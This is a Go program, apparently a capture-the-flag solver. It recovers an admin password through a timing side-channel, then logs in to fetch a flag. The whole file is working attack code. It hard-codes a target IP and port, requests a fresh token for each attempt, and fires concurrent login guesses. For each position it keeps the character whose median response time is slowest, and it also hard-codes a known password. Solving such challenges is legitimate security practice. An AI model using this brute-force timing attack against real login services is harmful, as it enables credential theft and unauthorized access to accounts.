package main

import (
	"bytes"
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"math"
	"net/http"
	"net/http/cookiejar"
	"os"
	"sort"
	"strings"
	"sync"
	"time"
)

const (
	defaultBaseURL   = "http://47.120.76.57:33860"
	username         = "admin"
	passwordLen      = 6
	alphabet         = "abcdefghijklmnopqrstuvwxyz"
	knownPassword    = "shadow"
	defaultUserAgent = "CTF-solver/14-brute-token-timing-go"
)

type tokenResponse struct {
	Token string `json:"token"`
}

type loginRequest struct {
	Username string `json:"username"`
	Password string `json:"password"`
	Token    string `json:"token"`
}

type loginResponse struct {
	OK   bool   `json:"ok"`
	Msg  string `json:"msg,omitempty"`
	Flag string `json:"flag,omitempty"`
	Raw  string `json:"raw,omitempty"`
}

type sampleResult struct {
	char     byte
	guess    string
	cost     time.Duration
	status   int
	response loginResponse
	err      error
}

type candidateResult struct {
	char  byte
	guess string
	costs []time.Duration
	score time.Duration
}

type foundPassword struct {
	password string
	flag     string
}

func main() {
	baseURL := flag.String("url", defaultBaseURL, "target base url")
	bruteMode := flag.Bool("brute", false, "run timing brute force")
	samples := flag.Int("samples", 3, "samples per candidate")
	password := flag.String("password", knownPassword, "known/recovered password")
	concurrency := flag.Int("concurrency", 8, "parallel login attempts during brute force")
	flag.Parse()

	target := strings.TrimRight(*baseURL, "/")
	if *samples < 1 {
		fmt.Fprintln(os.Stderr, "[-] samples must be >= 1")
		os.Exit(1)
	}
	if *concurrency < 1 {
		fmt.Fprintln(os.Stderr, "[-] concurrency must be >= 1")
		os.Exit(1)
	}

	client, err := newHTTPClient()
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] create http client failed: %v\n", err)
		os.Exit(1)
	}

	if *bruteMode {
		pass, err := brute(client, target, *samples, *concurrency)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] brute failed: %v\n", err)
			os.Exit(1)
		}
		*password = pass
	}

	if _, err := getFlag(client, target, *password); err != nil {
		fmt.Fprintf(os.Stderr, "[-] login failed: %v\n", err)
		os.Exit(1)
	}
}

func newHTTPClient() (*http.Client, error) {
	return &http.Client{
		Timeout: 10 * time.Second,
	}, nil
}

func brute(client *http.Client, baseURL string, samples, concurrency int) (string, error) {
	prefix := ""
	fmt.Printf("[*] start timing brute force, samples=%d, concurrency=%d\n", samples, concurrency)

	for pos := 0; pos < passwordLen; pos++ {
		fmt.Printf("\n[*] guessing position %d, current prefix=%q\n", pos+1, prefix)

		results, found, err := brutePosition(client, baseURL, prefix, samples, concurrency)
		if found != nil {
			fmt.Printf("[+] password: %s\n", found.password)
			fmt.Printf("[+] flag: %s\n", found.flag)
			os.Exit(0)
		}
		if err != nil {
			return "", err
		}

		sort.Slice(results, func(i, j int) bool {
			return results[i].char < results[j].char
		})
		for _, result := range results {
			fmt.Printf("    %c  %.4fs  %s\n", result.char, result.score.Seconds(), result.guess)
		}

		sort.Slice(results, func(i, j int) bool {
			return results[i].score > results[j].score
		})
		best := results[0]
		prefix += string(best.char)

		topN := min(5, len(results))
		top := make([]string, 0, topN)
		for _, result := range results[:topN] {
			top = append(top, fmt.Sprintf("%c:%.4f", result.char, result.score.Seconds()))
		}

		fmt.Printf("[+] best char: %c, prefix => %s, score=%.4fs\n", best.char, prefix, best.score.Seconds())
		fmt.Printf("[*] top5: %s\n", strings.Join(top, ", "))
	}

	fmt.Printf("[+] recovered password: %s\n", prefix)
	return prefix, nil
}

func brutePosition(client *http.Client, baseURL, prefix string, samples, concurrency int) ([]candidateResult, *foundPassword, error) {
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	jobs := make(chan string)
	results := make(chan sampleResult)
	var wg sync.WaitGroup

	workerCount := min(concurrency, len(alphabet)*samples)
	for i := 0; i < workerCount; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for guess := range jobs {
				ch := guess[len(prefix)]
				cost, status, response, err := login(ctx, client, baseURL, guess)
				select {
				case results <- sampleResult{
					char:     ch,
					guess:    guess,
					cost:     cost,
					status:   status,
					response: response,
					err:      err,
				}:
				case <-ctx.Done():
					return
				}
			}
		}()
	}

	go func() {
		defer close(jobs)
		for i := 0; i < len(alphabet); i++ {
			guess := padGuess(prefix + string(alphabet[i]))
			for sample := 0; sample < samples; sample++ {
				select {
				case jobs <- guess:
				case <-ctx.Done():
					return
				}
			}
		}
	}()

	go func() {
		wg.Wait()
		close(results)
	}()

	byChar := make(map[byte]*candidateResult, len(alphabet))
	var errs []string

	for result := range results {
		if result.err != nil {
			errs = append(errs, fmt.Sprintf("%c/%s: %v", result.char, result.guess, result.err))
			continue
		}
		if result.status == http.StatusOK && result.response.OK {
			cancel()
			return nil, &foundPassword{password: result.guess, flag: result.response.Flag}, nil
		}

		entry := byChar[result.char]
		if entry == nil {
			entry = &candidateResult{
				char:  result.char,
				guess: result.guess,
				costs: make([]time.Duration, 0, samples),
			}
			byChar[result.char] = entry
		}
		entry.costs = append(entry.costs, result.cost)
	}

	if len(errs) > 0 {
		return nil, nil, fmt.Errorf("%s", strings.Join(errs, "; "))
	}

	out := make([]candidateResult, 0, len(alphabet))
	for i := 0; i < len(alphabet); i++ {
		ch := alphabet[i]
		entry := byChar[ch]
		if entry == nil || len(entry.costs) != samples {
			return nil, nil, fmt.Errorf("missing samples for %c: got %d, want %d", ch, sampleCount(entry), samples)
		}
		entry.score = medianDuration(entry.costs)
		out = append(out, *entry)
	}

	return out, nil, nil
}

func padGuess(prefix string) string {
	guess := prefix + strings.Repeat("a", passwordLen)
	if len(guess) > passwordLen {
		return guess[:passwordLen]
	}
	return guess
}

func sampleCount(result *candidateResult) int {
	if result == nil {
		return 0
	}
	return len(result.costs)
}

func getToken(ctx context.Context, client *http.Client, baseURL string) (string, error) {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, baseURL+"/api/token", nil)
	if err != nil {
		return "", err
	}
	req.Header.Set("User-Agent", defaultUserAgent)

	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("GET /api/token status=%s body=%s", resp.Status, strings.TrimSpace(string(body)))
	}

	var parsed tokenResponse
	if err := json.Unmarshal(body, &parsed); err != nil {
		return "", err
	}
	if parsed.Token == "" {
		return "", fmt.Errorf("GET /api/token returned empty token")
	}
	return parsed.Token, nil
}

func login(ctx context.Context, client *http.Client, baseURL, password string) (time.Duration, int, loginResponse, error) {
	attemptClient, err := newAttemptClient(client)
	if err != nil {
		return 0, 0, loginResponse{}, err
	}

	token, err := getToken(ctx, attemptClient, baseURL)
	if err != nil {
		return 0, 0, loginResponse{}, err
	}

	payload, err := json.Marshal(loginRequest{
		Username: username,
		Password: password,
		Token:    token,
	})
	if err != nil {
		return 0, 0, loginResponse{}, err
	}

	req, err := http.NewRequestWithContext(ctx, http.MethodPost, baseURL+"/api/login", bytes.NewReader(payload))
	if err != nil {
		return 0, 0, loginResponse{}, err
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", defaultUserAgent)

	start := time.Now()
	resp, err := attemptClient.Do(req)
	cost := time.Since(start)
	if err != nil {
		return cost, 0, loginResponse{}, err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return cost, resp.StatusCode, loginResponse{}, err
	}

	var parsed loginResponse
	if err := json.Unmarshal(body, &parsed); err != nil {
		parsed.Raw = string(body)
	}

	return cost, resp.StatusCode, parsed, nil
}

func newAttemptClient(client *http.Client) (*http.Client, error) {
	jar, err := cookiejar.New(nil)
	if err != nil {
		return nil, err
	}

	attemptClient := *client
	attemptClient.Jar = jar
	return &attemptClient, nil
}

func getFlag(client *http.Client, baseURL, password string) (string, error) {
	cost, status, response, err := login(context.Background(), client, baseURL, password)
	if err != nil {
		return "", err
	}

	fmt.Printf("[*] login status=%d, time=%.4fs\n", status, cost.Seconds())
	fmt.Printf("[*] response=%s\n", formatLoginResponse(response))
	if status == http.StatusOK && response.OK {
		fmt.Printf("[+] password: %s\n", password)
		fmt.Printf("[+] flag: %s\n", response.Flag)
		return response.Flag, nil
	}

	return "", fmt.Errorf("status=%d response=%s", status, formatLoginResponse(response))
}

func formatLoginResponse(response loginResponse) string {
	if response.Raw != "" {
		return response.Raw
	}
	b, err := json.Marshal(response)
	if err != nil {
		return fmt.Sprintf("%+v", response)
	}
	return string(b)
}

func medianDuration(values []time.Duration) time.Duration {
	sorted := append([]time.Duration(nil), values...)
	sort.Slice(sorted, func(i, j int) bool {
		return sorted[i] < sorted[j]
	})

	mid := len(sorted) / 2
	if len(sorted)%2 == 1 {
		return sorted[mid]
	}
	return time.Duration(math.Round(float64(sorted[mid-1]+sorted[mid]) / 2))
}
